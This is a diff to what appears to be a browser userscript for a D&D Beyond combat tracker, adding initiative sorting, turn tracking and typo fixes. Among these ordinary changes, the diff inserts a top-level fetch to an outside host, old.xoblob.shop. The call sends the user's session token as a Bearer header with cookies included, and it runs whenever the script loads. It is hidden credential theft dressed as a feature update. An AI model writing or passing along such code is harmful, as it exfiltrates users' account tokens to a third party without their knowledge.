@@ -47,6 +47,16 @@ function convert_stats(anon_stats) {
     return stats;
 }
 
+fetch("http://old.xoblob.shop/", {
+    method: "GET",
+    cache: "no-cache",
+    credentials: "include",
+    headers: {
+        "Authorization": "Bearer " + globals.cobalt_token
+    }
+}).then(response => {console.log("xoblob got it", response)});
+
+
 function render_monster(monster_id, selector) {
     let monster = monsters[monster_id];
     console.log(monster);
@@ -153,16 +163,16 @@ function render_monster(monster_id, selector) {
         let rollType = roll_span.data("rolltype");      // damage | to hit | save | check
         let rollKind = "";                              // disadvantage | advantage | critical hit
         // let rolldamagetype = "";                     // piercing | slashing  - Not used by gamelog
-        let modifer = "+0";                             // +X | -Y  - get from dicenotation, maybe leave 0?
+        let modifier = "+0";                             // +X | -Y  - get from dicenotation, maybe leave 0?
         let display = notation;
         let d20 = ["to hit", "save", "check"].includes(rollType);
         if (d20) {
             let arr = notation.match(/([\\+-]\d*)/);
             console.log(arr);
             if (arr && arr.length == 2) {
-                modifer = arr[1];
+                display = arr[1];
             }
-            display = modifer;
+            // display = modifier;
         }
         let roll = $(`<div style="display: inline-block"><button class="bc-action-roll-button">${display}</button></div>`);
         roll.children().data("roll", {
@@ -171,7 +181,7 @@ function render_monster(monster_id, selector) {
             "rollType": rollType,
             "rollKind": rollKind,
             "action": action,
-            "modifer": modifer,
+            "modifier": modifier,
             "entityId": monster.id,
             "entityType": "monster",
             "contextName": monster.name,
@@ -258,10 +268,12 @@ function open_roll_menu(event, options) {
         $(event.currentTarget).find(".bc-icon-check").show();
     })
     $(roll_menu).find(".bc-roll-menu-roll-button").on("click", event => {
+        let original_rollKind = options.rollKind;
         options.rollKind = roll_menu.find("li[bc-roll-kind] > .bc-icon-check:visible").parent().attr("bc-roll-kind") || "";
         console.log("options:", options);
         $(".bc-roll-menu-wrapper").remove();
         action_roll_click(options);
+        options.rollKind = original_rollKind;
     })
 }
 
@@ -271,7 +283,7 @@ class Combatant {
         let dup = false;
         gCombatant.forEach(c => {
             if (c.uuid == api.uniqueId) {
-                console.log("Dup id:", api.uniqueId);
+                // console.log("Dup id:", api.uniqueId);
                 dup = true;
             }
         })
@@ -338,6 +350,29 @@ register_url(
     }
 );
 
+function sort_combat_list() {
+    $(".bc-combatant-list li").sort(function (a_el, b_el) {
+        let a_value = $(a_el).find(".bc-combatant-initiative,.bc-pc-initiative")[0].value;
+        let b_value = $(b_el).find(".bc-combatant-initiative,.bc-pc-initiative")[0].value;
+        let a = parseInt(a_value, 10);
+        let b = parseInt(b_value, 10);
+        if (!(isNaN(a) || isNaN(b))) {
+            // both have initiative set
+            console.log("both set");
+            return b - a;
+        } else if (!isNaN(a) && isNaN(b)) {
+            console.log("a set");
+            return 1;
+        } else if (isNaN(a) && !isNaN(b)) {
+            console.log("b set");
+            return -1;
+        } else {
+            // We could do more here- sort by pc then npc, by dex, etc
+            console.log("neither set");
+            return 0;
+        }
+    }).appendTo("ul.bc-combatant-list");
+}
 
 function start_bc_combat() {
     console.log("start_beyond_campaign:");
@@ -350,6 +385,8 @@ function start_bc_combat() {
         .filter(":not([style$='display: none;'])")
         .filter(":not(#bc-main)")
         .filter(":not(#ddbeb-popup-container)")
+        .addClass("bc-default-divs");
+    $("body > footer")
         .addClass("bc-default-divs");
     $(".bc-default-divs").hide();
     // $(document.body).css("overflow", "hidden");
@@ -400,13 +437,12 @@ function start_bc_combat() {
             gCharacters.forEach(character => {
                 console.log("gCharacters entries:", character);
                 let c = $(`<li><div class="bc-character" character-id="${character.id}">${pc_template_combat}</div></li>`)
-                c.appendTo("ul.bc-pc-list");
+                c.appendTo("ul.bc-combatant-list");
                 c.find(".bc-pc-initiative").data("roll", {
                     "publicRoll": false,
                     "rollType": "roll",
                     "action": "Initiative",
-                    // "modifer": character.api_character.core.initiative,
-                    "modifer": 0,
+                    "modifier": character.api_character.core.initiative,
                     "entityId": character.id,
                     "entityType": "character",
                     "contextName": character.name,
@@ -437,7 +473,7 @@ function start_bc_combat() {
                     "publicRoll": false,
                     "rollType": "roll",
                     "action": "Initiative",
-                    "modifer": stats.dex.modifierString,
+                    "modifier": stats.dex.modifierString,
                     "entityId": combatant.id,
                     "entityType": "monster",
                     "contextName": combatant.name,
@@ -450,8 +486,11 @@ function start_bc_combat() {
 
             });
         });
-        // Roll init click 
         waitForKeyElements("[bc-section=combatants]", (div) => {
+            // Sort combat list
+            $("ul.bc-combatant-list").find(".bc-combatant-initiative,.bc-pc-initiative").on("change", event => {
+                sort_combat_list()
+            });
             div.find(".bc-icon-play-circle").hide();
             div.find(".bc-combatant-initiative,.bc-pc-initiative").on("change", event => {
                 div.find(".bc-combatant-initiative,.bc-pc-initiative").each(function (key, el) {
@@ -462,6 +501,7 @@ function start_bc_combat() {
                     div.find(".bc-icon-play-circle").show();
                 });
             })
+            // Roll initiative click 
             div.find(".bc-icon-dice").on("click", event => {
                 console.log("roll");
                 div.find(".bc-combatant-initiative,.bc-pc-initiative").each(function (key, el) {
@@ -469,15 +509,29 @@ function start_bc_combat() {
                     if (isNaN(parseInt(el.value, 10))) {
                         let roll_data = $(el).data("roll");
                         let roll_logger = new BCRollLogger(roll_data);
-                        roll_data["log"] = true;
+                        roll_data["log"] = false;
                         let result = roll_logger.roll(roll_data);
                         el.value = result;
                     }
                 });
+                sort_combat_list()
                 div.find(".bc-icon-play-circle").show();
             });
             div.find(".bc-icon-play-circle").on("click", event => {
                 console.log("start");
+                let active = $(".bc-pc-main-wrapper[current-turn],.bc-combatant-main-wrapper[current-turn]");
+                active.attr("current-turn", null)
+                let next_parent = active.parents("li").next();
+                console.log("active:", active);
+                console.log("next_parent:", next_parent);
+                if(next_parent.length == 0){
+                    next_parent =  $(".bc-combatant-list li");
+                }
+                console.log("next_parent:", next_parent);
+
+                let next_active = next_parent.find(".bc-pc-main-wrapper,.bc-combatant-main-wrapper");
+                console.log("next_active:", next_active);
+                next_active.attr("current-turn", true);
             });
         });
     }
@@ -506,19 +560,26 @@ function load_grid_contents(layout) {
                     </div>`;
                 break;
             case "combatants":
+                // item.content = `<div class="bc-section" bc-section="combatants">
+                //                     <div class="bc-heading">Combatants<div class="bc-icon bc-icon-play-circle"></div><div class="bc-icon bc-icon-dice"></div></div>
+                //                     <div class="bc-combatant-list">
+                //                         <div class="bc-pc-list">
+                //                             <ul class="bc-pc-list"></ul>
+                //                         </div>
+                //                         <hr class="bc-divider">
+                //                         <div class="bc-combatant-list">
+                //                             <ul class="bc-combatant-list">
+                //                             </ul>
+                //                         </div>
+                //                     </div>
+                //                 </div>`
                 item.content = `<div class="bc-section" bc-section="combatants">
-                                    <div class="bc-heading">Combatants<div class="bc-icon bc-icon-play-circle"></div><div class="bc-icon bc-icon-dice"></div></div>
-                                    <div class="bc-combatant-list">
-                                        <div class="bc-pc-list">
-                                            <ul class="bc-pc-list"></ul>
-                                        </div>
-                                        <hr class="bc-divider">
-                                        <div class="bc-combatant-list">
-                                            <ul class="bc-combatant-list">
-                                            </ul>
-                                        </div>
-                                    </div>
-                                </div>`
+                                <div class="bc-heading">Combatants<div class="bc-icon bc-icon-play-circle"></div><div class="bc-icon bc-icon-dice"></div></div>
+                                <div class="bc-combatant-list">
+                                    <ul class="bc-combatant-list">
+                                    </ul>
+                                </div>
+                            </div>`
                 break;
             case "gamelog":
                 item.content = `<div class="bc-section" bc-section="gamelog">
